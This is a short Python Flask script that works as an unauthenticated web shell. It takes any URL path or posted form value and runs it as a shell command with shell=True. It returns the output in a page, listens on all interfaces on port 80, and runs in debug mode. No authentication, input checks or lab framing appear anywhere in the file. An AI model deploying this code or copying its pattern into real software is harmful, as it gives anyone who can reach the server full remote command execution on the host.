#!/usr/bin/python

from flask import *
import os
import subprocess


app = Flask(__name__)


@app.route("/<path:command>", methods = ['GET', 'POST'])
@app.route("/", methods = ['GET', 'POST'])
def home(command = None):

    msg = None
    if command:
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        msg = p.communicate()[0]
        msg = msg.split("\n")

    return render_template("index.html", command = command, msg = msg)

@app.route('/add', methods = ["POST"])
def add():
    command = request.form['post']
    return redirect(url_for("home", command = command))

app.run(host='0.0.0.0', port=80, debug=True)